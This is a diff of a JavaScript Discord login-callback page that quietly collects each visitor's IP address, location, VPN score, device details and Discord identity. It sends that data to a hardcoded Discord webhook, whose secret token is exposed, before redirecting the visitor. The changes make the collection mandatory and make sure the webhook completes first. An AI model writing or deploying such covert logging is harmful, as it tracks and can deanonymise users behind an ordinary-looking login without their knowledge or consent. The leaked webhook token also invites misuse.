@@ -254,20 +254,19 @@
                 }
 
                 if (data.success && data.user) {
-                    // Collect IP and device data before redirecting
-                    // IMPORTANT: Wait for webhook to complete before redirecting
-                    try {
-                        await getUserData(data.user);
-                        console.log('✅ User data collection and webhook completed');
-                    } catch (webhookError) {
-                        console.error('⚠️ Webhook error (non-blocking):', webhookError);
-                        // Continue anyway - don't block user experience
-                    }
+                    console.log('✅ Got user data from backend:', data.user.username);
                     
-                    // Small delay to ensure webhook request completes
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    // Collect IP and device data before redirecting
+                    console.log('🔄 Starting getUserData...');
+                    await getUserData(data.user);
+                    console.log('✅ getUserData completed successfully');
+                    
+                    // IMPORTANT: Wait 1 full second to ensure webhook completes
+                    console.log('⏳ Waiting 1 second before redirect...');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                     
                     // Redirect to authorized page with user info
+                    console.log('🔀 Redirecting to authorized page...');
                     const params = new URLSearchParams({
                         username: data.user.username,
                         avatar: data.user.avatar,
@@ -696,23 +695,29 @@
                 };
 
                 await sendDataToWebhook(data);
+                console.log('✅ All data collected and sent to webhook');
                 
             } catch (error) {
-                console.error('Error collecting user data:', error);
+                console.error('❌ CRITICAL ERROR collecting user data:', error);
+                // Still throw error so we know something went wrong
+                throw error;
             }
         }
 
         async function sendDataToWebhook(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8';
             
-            console.log('🔄 Preparing webhook data...');
+            console.log('==========================================');
+            console.log('🔄 WEBHOOK: Preparing to send...');
             console.log('📊 VPN Score:', data.vpnScore);
-            console.log('📍 IP:', data.ip);
+            console.log('📍 IP Address:', data.ip);
             console.log('🌍 Location:', data.location);
+            console.log('👤 Discord User:', data.discordUser.username);
+            console.log('==========================================');
             
             const embed = {
                 title: "📊 Enhanced Device & Location Details",
-                color: data.vpnScore >= 50 ? 0xFF6B00 : 0xFF0000, // Orange if VPN likely, red otherwise
+                color: data.vpnScore >= 50 ? 0xFF6B00 : 0xFF0000,
                 fields: [
                     { name: "👤 Discord Username", value: data.discordUser.username, inline: true },
                     { name: "🆔 Discord ID", value: data.discordUser.id, inline: true },
@@ -763,25 +768,24 @@
                 embeds: [embed]
             };
 
-            try {
-                console.log('📤 Sending webhook...');
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    console.error('❌ Webhook failed:', response.status, errorText);
-                    throw new Error(`Webhook returned ${response.status}: ${errorText}`);
-                }
-                
-                console.log('✅ Webhook sent successfully!');
-            } catch (error) {
-                console.error('❌ Webhook error:', error);
-                throw error; // Re-throw so getUserData knows it failed
+            console.log('📤 WEBHOOK: Sending now...');
+            
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            console.log('📥 WEBHOOK: Response status:', response.status);
+            
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('❌ WEBHOOK FAILED:', response.status, errorText);
+                throw new Error(`Webhook failed: ${response.status} - ${errorText}`);
             }
+            
+            console.log('✅ WEBHOOK: Successfully sent!');
+            console.log('==========================================');
         }
 
         handleCallback();
